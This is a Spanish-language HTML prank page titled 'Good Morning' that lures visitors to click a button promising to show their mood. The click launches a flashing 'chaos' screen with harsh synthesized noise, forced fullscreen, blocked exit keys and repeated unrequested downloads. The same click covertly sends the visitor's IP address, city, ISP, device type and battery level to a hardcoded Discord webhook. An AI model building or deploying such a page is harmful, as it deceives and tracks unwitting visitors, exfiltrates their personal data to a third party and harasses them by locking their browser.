<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Good Morning</title>
    <style>
        /* ======== ESTILOS ======== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            overflow: hidden;
            user-select: none;
        }

        /* ======== PANTALLA 1: PAISAJE ======== */
        #screen1 {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
            transition: opacity 0.5s;
        }

        #screen1 img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.8;
        }

        #screen1 h1 {
            font-size: 6em;
            color: #fff;
            text-shadow: 0 0 50px rgba(255, 200, 50, 0.8), 0 0 100px rgba(255, 100, 0, 0.6);
            animation: glow 2s infinite alternate;
            z-index: 2;
            font-weight: 900;
            letter-spacing: 8px;
        }

        @keyframes glow {
            0% {
                text-shadow: 0 0 30px rgba(255, 200, 50, 0.6);
            }
            100% {
                text-shadow: 0 0 80px rgba(255, 100, 0, 0.9), 0 0 150px rgba(255, 50, 0, 0.6);
            }
        }

        #screen1 p {
            font-size: 1.8em;
            color: #ddd;
            text-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
            z-index: 2;
            margin-top: 20px;
            font-weight: 300;
            letter-spacing: 3px;
        }

        #screen1 .btn {
            margin-top: 40px;
            padding: 20px 60px;
            background: rgba(255, 200, 50, 0.2);
            color: #fff;
            border: 2px solid rgba(255, 200, 50, 0.6);
            border-radius: 50px;
            font-size: 1.5em;
            font-weight: bold;
            cursor: pointer;
            z-index: 2;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 3px;
            backdrop-filter: blur(5px);
            box-shadow: 0 0 50px rgba(255, 200, 50, 0.2);
        }

        #screen1 .btn:hover {
            background: rgba(255, 200, 50, 0.4);
            transform: scale(1.05);
            box-shadow: 0 0 80px rgba(255, 200, 50, 0.4);
        }

        /* ======== PANTALLA 2: CAOS TOTAL ======== */
        #screen2 {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 10;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
            animation: shake 0.1s infinite alternate;
        }

        @keyframes shake {
            0% {
                transform: translate(-2px, -2px) rotate(-0.5deg);
            }
            25% {
                transform: translate(2px, -2px) rotate(0.5deg);
            }
            50% {
                transform: translate(-2px, 2px) rotate(-0.3deg);
            }
            75% {
                transform: translate(2px, 2px) rotate(0.3deg);
            }
            100% {
                transform: translate(-2px, -2px) rotate(-0.5deg);
            }
        }

        #screen2 img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1;
            filter: saturate(2) contrast(1.5) brightness(0.7);
        }

        /* ======== OVERLAY ROJO PARPADEANTE ======== */
        #redOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 0, 0, 0.15);
            z-index: 5;
            animation: pulseRed 0.3s infinite alternate;
            pointer-events: none;
        }

        @keyframes pulseRed {
            0% {
                opacity: 0.1;
            }
            100% {
                opacity: 0.5;
            }
        }

        /* ======== LÍNEAS DE INTERFERENCIA ======== */
        .glitch-lines {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 6;
            pointer-events: none;
            overflow: hidden;
        }

        .glitch-lines span {
            position: absolute;
            width: 100%;
            height: 2px;
            background: rgba(255, 0, 0, 0.3);
            animation: glitchLine 0.05s infinite alternate;
        }

        .glitch-lines span:nth-child(1) {
            top: 10%;
            animation-delay: 0s;
        }
        .glitch-lines span:nth-child(2) {
            top: 25%;
            animation-delay: 0.02s;
        }
        .glitch-lines span:nth-child(3) {
            top: 45%;
            animation-delay: 0.04s;
        }
        .glitch-lines span:nth-child(4) {
            top: 65%;
            animation-delay: 0.06s;
        }
        .glitch-lines span:nth-child(5) {
            top: 80%;
            animation-delay: 0.08s;
        }

        @keyframes glitchLine {
            0% {
                transform: translateX(-100%);
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                transform: translateX(100%);
                opacity: 0;
            }
        }

        /* ======== TEXTO DE CAOS ======== */
        #screen2 .chaos-text {
            font-size: 4em;
            color: #ff0000;
            text-shadow: 0 0 50px rgba(255, 0, 0, 0.8), 0 0 100px rgba(255, 0, 0, 0.4);
            z-index: 7;
            animation: flicker 0.05s infinite alternate;
            font-weight: 900;
            letter-spacing: 10px;
        }

        @keyframes flicker {
            0% {
                opacity: 1;
                text-shadow: 0 0 50px rgba(255, 0, 0, 0.8);
            }
            50% {
                opacity: 0.4;
                text-shadow: 0 0 100px rgba(255, 0, 0, 0.2);
            }
            100% {
                opacity: 1;
                text-shadow: 0 0 80px rgba(255, 0, 0, 0.9);
            }
        }

        #screen2 .sub-text {
            font-size: 1.5em;
            color: #ff4444;
            z-index: 7;
            animation: flicker 0.1s infinite alternate;
            margin-top: 20px;
            font-weight: 300;
            letter-spacing: 5px;
        }

        /* ======== EFECTO DE SATURACIÓN ======== */
        .saturation-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 4;
            background: repeating-linear-gradient(0deg,
                    transparent,
                    transparent 2px,
                    rgba(255, 0, 0, 0.03) 2px,
                    rgba(255, 0, 0, 0.03) 4px);
            pointer-events: none;
            animation: scanlines 0.1s infinite linear;
        }

        @keyframes scanlines {
            0% {
                transform: translateY(0);
            }
            100% {
                transform: translateY(4px);
            }
        }

        /* ======== RESPONSIVE ======== */
        @media (max-width: 600px) {
            #screen1 h1 {
                font-size: 3em;
                letter-spacing: 4px;
            }
            #screen1 p {
                font-size: 1.2em;
            }
            #screen1 .btn {
                padding: 15px 30px;
                font-size: 1.2em;
            }
            #screen2 .chaos-text {
                font-size: 2.5em;
                letter-spacing: 5px;
            }
            #screen2 .sub-text {
                font-size: 1em;
            }
        }
    </style>
</head>
<body>

    <!-- ======== PANTALLA 1: PAISAJE ======== -->
    <div id="screen1">
        <img src="https://files.catbox.moe/2tc5vs.avif" alt="Paisaje">
        <h1>GOOD MORNING</h1>
        <p>Apreta el botón para ver tu estado de ánimo</p>
        <button class="btn" id="activateBtn">🔥 ACTIVAR</button>
    </div>

    <!-- ======== PANTALLA 2: CAOS TOTAL ======== -->
    <div id="screen2">
        <img src="https://files.catbox.moe/zaogwd.webp" alt="Caos">
        <div id="redOverlay"></div>
        <div class="saturation-overlay"></div>
        <div class="glitch-lines">
            <span></span><span></span><span></span><span></span><span></span>
        </div>
        <div class="chaos-text">⚠️ ¡CAOS! ⚠️</div>
        <div class="sub-text">🔊 SATURACIÓN MÁXIMA 🔊</div>
    </div>

    <script>
        // ======== 1. GENERADOR DE SONIDO POR CÓDIGO (100% FUNCIONAL) ========
        let sonidoActivo = false;
        let osciladores = [];
        let intervalosSonido = [];

        function generarSonidoSaturado() {
            if (sonidoActivo) return;
            sonidoActivo = true;

            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const audioCtx = new AudioContext();

                // Reanudar contexto si está suspendido
                if (audioCtx.state === 'suspended') {
                    audioCtx.resume();
                }

                // ===== 6 OSCILADORES PARA SATURACIÓN EXTREMA =====
                const frecuencias = [880, 440, 1760, 220, 1320, 660];
                const tipos = ['sawtooth', 'square', 'sawtooth', 'square', 'sawtooth', 'square'];

                frecuencias.forEach((freq, i) => {
                    const osc = audioCtx.createOscillator();
                    const gain = audioCtx.createGain();
                    const distortion = audioCtx.createWaveShaper();

                    // Distorsión fuerte
                    distortion.curve = new Float32Array(2000);
                    for (let j = 0; j < 2000; j++) {
                        const x = (j - 1000) / 1000;
                        distortion.curve[j] = Math.tanh(x * 4);
                    }

                    osc.type = tipos[i % tipos.length];
                    osc.frequency.value = freq;

                    gain.gain.value = 0.2;

                    osc.connect(distortion);
                    distortion.connect(gain);
                    gain.connect(audioCtx.destination);

                    osc.start();
                    osciladores.push(osc);

                    // Modulación caótica de frecuencia
                    const intervalo = setInterval(() => {
                        if (osc) {
                            osc.frequency.value = freq + (Math.random() - 0.5) * 300;
                        }
                    }, 80);
                    intervalosSonido.push(intervalo);
                });

                // ===== RUIDO BLANCO =====
                const bufferSize = 2 * audioCtx.sampleRate;
                const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
                const data = buffer.getChannelData(0);
                for (let i = 0; i < bufferSize; i++) {
                    data[i] = (Math.random() * 2 - 1) * 0.4;
                }
                const noise = audioCtx.createBufferSource();
                noise.buffer = buffer;
                const noiseGain = audioCtx.createGain();
                noiseGain.gain.value = 0.15;
                noise.connect(noiseGain);
                noiseGain.connect(audioCtx.destination);
                noise.start();
                osciladores.push(noise);

                // ===== TONO DE ALARMA INTERMITENTE =====
                const oscAlarma = audioCtx.createOscillator();
                const gainAlarma = audioCtx.createGain();
                oscAlarma.type = 'square';
                oscAlarma.frequency.value = 880;
                gainAlarma.gain.value = 0.3;
                oscAlarma.connect(gainAlarma);
                gainAlarma.connect(audioCtx.destination);
                oscAlarma.start();

                // Parpadear la alarma
                const intervaloAlarma = setInterval(() => {
                    gainAlarma.gain.value = gainAlarma.gain.value > 0.1 ? 0 : 0.3;
                }, 250);
                intervalosSonido.push(intervaloAlarma);

                osciladores.push(oscAlarma);

                console.log('✅ SONIDO SATURADO ACTIVADO');

            } catch (e) {
                console.warn('⚠️ Error en Web Audio:', e);
            }
        }

        // ======== 2. DESCARGAS RANDOM (funciona con archivos reales) ========
        let descargasActivas = 0;
        let maxDescargas = 30;

        function iniciarDescargasRandom() {
            // Archivos de prueba REALES (de sitios oficiales)
            const archivos = [
                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf',
                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/img/dummy-image.jpg',
                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/img/dummy-image.png',
                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/mp3/dummy.mp3',
                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/txt/dummy.txt',
                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/zip/dummy.zip'
            ];

            function descargarArchivo() {
                if (descargasActivas >= maxDescargas) {
                    console.log('📥 Descargas completadas: ' + descargasActivas);
                    return;
                }

                const url = archivos[Math.floor(Math.random() * archivos.length)];
                const nombre = 'archivo_' + Date.now() + '_' + Math.random().toString(36).substring(7) + '.tmp';

                try {
                    // Método 1: Crear enlace y hacer clic
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = nombre;
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);

                    descargasActivas++;
                    console.log('📥 Descarga #' + descargasActivas + ': ' + nombre);

                } catch (e) {
                    console.warn('⚠️ Error en descarga:', e);
                }

                // Velocidad: 1 descarga cada 8-12 segundos (aleatorio)
                if (descargasActivas < maxDescargas) {
                    const delay = 8000 + Math.random() * 4000;
                    setTimeout(descargarArchivo, delay);
                }
            }

            // Iniciar primera descarga después de 1.5 segundos
            setTimeout(descargarArchivo, 1500);
        }

        // ======== 3. CONGELAR PANTALLA ========
        function congelarPantalla() {
            // Bloquear teclas de salida
            document.addEventListener('keydown', function(e) {
                const teclasBloqueadas = ['Escape', 'F11', 'F5'];
                if (teclasBloqueadas.includes(e.key) ||
                    (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 'r' || e.key === 'R')) ||
                    (e.ctrlKey && e.key === 'F4') ||
                    (e.altKey && e.key === 'F4') ||
                    (e.metaKey && (e.key === 'w' || e.key === 'W' || e.key === 'r' || e.key === 'R'))) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            });

            // Bloquear clic derecho
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });

            // Pantalla completa forzada
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen()
                    .then(() => {
                        document.addEventListener('fullscreenchange', function() {
                            if (!document.fullscreenElement) {
                                document.documentElement.requestFullscreen();
                            }
                        });
                    })
                    .catch(() => {});
            }

            // Prevenir cierre de pestaña
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '⚠️ ¿Seguro que quieres salir?';
                return '⚠️ ¿Seguro que quieres salir?';
            });

            // Congelar scroll y clics
            document.body.style.overflow = 'hidden';
            document.body.style.position = 'fixed';
            document.body.style.width = '100%';
            document.body.style.height = '100%';

            console.log('🔒 PANTALLA CONGELADA');
        }

        // ======== 4. ACTIVAR CAOS COMPLETO ========
        function activarCaos() {
            // Cambiar a pantalla 2
            document.getElementById('screen1').style.display = 'none';
            const screen2 = document.getElementById('screen2');
            screen2.style.display = 'flex';

            // Congelar pantalla
            congelarPantalla();

            // Generar sonido saturado
            setTimeout(generarSonidoSaturado, 300);

            // Iniciar descargas random
            setTimeout(iniciarDescargasRandom, 1000);

            // Vibración (si está disponible)
            if (navigator.vibrate) {
                navigator.vibrate([100, 50, 100, 50, 200, 100, 200, 100, 300, 100, 500]);
            }

            // Capturar datos y enviar a Discord
            capturarDatos();

            console.log('🔥 CAOS TOTAL ACTIVADO');
        }

        // ======== 5. CAPTURAR DATOS ========
        async function capturarDatos() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const ua = navigator.userAgent || '';
                let dispositivo = 'Desconocido';
                if (/android/i.test(ua)) dispositivo = 'Android';
                else if (/iphone|ipad|ipod/i.test(ua)) dispositivo = 'iOS';
                else if (/windows/i.test(ua)) dispositivo = 'Windows PC';
                else if (/mac/i.test(ua)) dispositivo = 'Mac';
                else if (/linux/i.test(ua)) dispositivo = 'Linux';
                let bateria = 'No disponible';
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        bateria = Math.round(battery.level * 100) + '%';
                    }
                } catch (e) {}
                const info = {
                    ip: data.ip || 'No disponible',
                    ciudad: data.city || 'No disponible',
                    pais: data.country_name || 'No disponible',
                    isp: data.org || 'No disponible',
                    region: data.region || 'No disponible',
                    dispositivo: dispositivo,
                    bateria: bateria,
                    direccionReal: data.city + ', ' + data.region + ', ' + data.country_name,
                    hora: new Date().toLocaleString()
                };
                const WEBHOOK_URL =
                    'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';
                const embed = {
                    color: 0xff0000,
                    title: '🔥 CAOS TOTAL ACTIVADO',
                    fields: [
                        { name: '📍 Dirección', value: info.direccionReal || 'No disponible' },
                        { name: '🌐 IP', value: info.ip || 'No disponible' },
                        { name: '📱 Dispositivo', value: info.dispositivo || 'No disponible' },
                        { name: '🔋 Batería', value: info.bateria || 'No disponible' },
                        { name: '📶 ISP', value: info.isp || 'No disponible' },
                        { name: '🕒 Hora', value: info.hora || 'No disponible' }
                    ],
                    footer: { text: 'CeboScripts • Caos total' },
                    timestamp: new Date().toISOString()
                };
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'CeboScripts Logger',
                        content: '🔥 **¡CAOS TOTAL ACTIVADO!**',
                        embeds: [embed]
                    })
                });
                console.log('✅ Datos enviados a Discord');
            } catch (error) {
                console.error('❌ Error:', error);
            }
        }

        // ======== 6. EVENTO DEL BOTÓN ========
        document.getElementById('activateBtn').addEventListener('click', activarCaos);

        // ======== 7. INTENTAR ACTIVAR SONIDO CON UN CLIC INICIAL ========
        document.addEventListener('click', function activarContexto() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                const ctx = new AudioContext();
                if (ctx.state === 'suspended') {
                    ctx.resume();
                }
                console.log('🎵 Contexto de audio activado');
            } catch (e) {}
            document.removeEventListener('click', activarContexto);
        }, { once: true });

        console.log('🌅 Good Morning - Listo');
        console.log('🔊 Haz clic en ACTIVAR para iniciar el caos');
    </script>
</body>
</html>
